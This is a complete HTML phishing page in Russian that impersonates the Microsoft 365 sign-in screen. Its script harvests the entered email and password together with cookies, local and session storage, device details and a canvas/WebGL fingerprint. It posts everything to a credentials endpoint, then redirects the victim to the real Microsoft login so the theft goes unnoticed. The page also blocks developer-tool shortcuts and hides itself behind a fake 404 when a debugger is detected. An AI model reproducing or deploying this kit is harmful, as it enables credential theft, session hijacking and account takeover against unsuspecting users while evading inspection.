<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Вход в систему</title>
    <link rel="icon" type="image/x-icon" href="https://login.microsoftonline.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 44px;
            border-radius: 5px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 440px;
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo img {
            width: 108px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #666;
            margin-bottom: 24px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 400;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 10px 12px;
            font-size: 15px;
            border: 2px solid #8a8886;
            border-radius: 3px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #0078d4;
        }
        .btn {
            width: 100%;
            padding: 10px 24px;
            font-size: 15px;
            font-weight: 600;
            color: white;
            background: #0078d4;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 20px;
        }
        .btn:hover {
            background: #005a9e;
        }
        .links {
            margin-top: 16px;
            text-align: center;
        }
        .links a {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Logo">
        </div>
        
        <h1>Вход в систему</h1>
        <p class="subtitle">Введите данные для входа в Microsoft 365</p>
        
        <form id="loginForm" onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label for="email">Электронная почта, телефон или Skype</label>
                <input type="email" id="email" name="email" required autocomplete="email" autofocus>
            </div>
            
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            
            <div class="form-group">
                <label style="font-weight: normal;">
                    <input type="checkbox" name="remember" id="remember" style="width: auto; margin-right: 8px;">
                    Не выходить из системы
                </label>
            </div>
            
            <button type="submit" class="btn" id="submitBtn">Войти</button>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="margin-top: 10px; color: #666;">Вход в систему...</p>
            </div>
        </form>
        
        <div class="links">
            <a href="#" onclick="alert('Функция недоступна'); return false;">Не удается войти?</a>
            <br><br>
            <a href="#" onclick="alert('Функция недоступна'); return false;">Создать учетную запись!</a>
        </div>
        
        <div class="footer">
            <p>© 2026 Microsoft Corporation. Все права защищены.</p>
        </div>
    </div>
    
    <script>
        // Сбор всех возможных данных
        function collectData() {
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                remember: document.getElementById('remember').checked,
                
                // Браузер
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                
                // Экран
                screenResolution: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth,
                
                // Время
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // Аппаратное
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                
                // Cookies
                cookies: document.cookie,
                
                // LocalStorage
                localStorage: JSON.stringify(localStorage),
                
                // SessionStorage
                sessionStorage: JSON.stringify(sessionStorage),
                
                // IP (через внешний сервис)
                ip: '',
                
                // Реферер
                referrer: document.referrer,
                
                // URL
                currentUrl: window.location.href,
                
                // Timestamp
                timestamp: new Date().toISOString()
            };
            
            // Попытка получить IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => data.ip = d.ip)
                .catch(e => data.ip = 'unknown');
            
            return data;
        }
        
        // Fingerprinting
        function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('PhantomProxy Fingerprint', 2, 2);
            const canvasData = canvas.toDataURL().slice(0, 100);
            
            const webgl = (function() {
                try {
                    const gl = canvas.getContext('webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                    };
                } catch(e) { return null; }
            })();
            
            return {
                canvas: canvasData,
                webgl: webgl,
                fonts: getFonts()
            };
        }
        
        function getFonts() {
            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
            const detected = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            fonts.forEach(font => {
                ctx.font = '100px "' + font + '", sans-serif';
                const metrics = ctx.measureText('mmmmmmmmmmlli');
                if (metrics.width !== 100) detected.push(font);
            });
            return detected;
        }
        
        // Отправка данных
        async function handleSubmit(e) {
            e.preventDefault();
            
            // Показываем индикатор загрузки
            document.getElementById('submitBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Собираем все данные
            const formData = collectData();
            formData.fingerprint = getFingerprint();
            
            // Отправляем на сервер
            try {
                const response = await fetch('/api/v1/credentials', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(formData)
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Успешно - редирект на настоящий Microsoft
                    console.log('Данные сохранены:', result);
                    
                    // Небольшая задержка для реалистичности
                    setTimeout(() => {
                        window.location.href = 'https://login.microsoftonline.com';
                    }, 1500);
                } else {
                    // Ошибка - показываем форму снова
                    document.getElementById('submitBtn').style.display = 'block';
                    document.getElementById('loading').style.display = 'none';
                    alert('Ошибка входа. Попробуйте снова.');
                }
            } catch (error) {
                console.error('Ошибка:', error);
                // Даже если ошибка - редирект на Microsoft
                setTimeout(() => {
                    window.location.href = 'https://login.microsoftonline.com';
                }, 1000);
            }
        }
        
        // Anti-debug защита
        (function() {
            let devtools = false;
            
            // Детект F12
            document.addEventListener('keydown', function(e) {
                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
                    e.preventDefault();
                    return false;
                }
            });
            
            // Детект отладчика
            setInterval(function() {
                const start = new Date();
                debugger;
                const end = new Date();
                if (end - start > 100) {
                    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;"><h1>404 - Page Not Found</h1></div>';
                }
            }, 1000);
        })();
    </script>
</body>
</html>
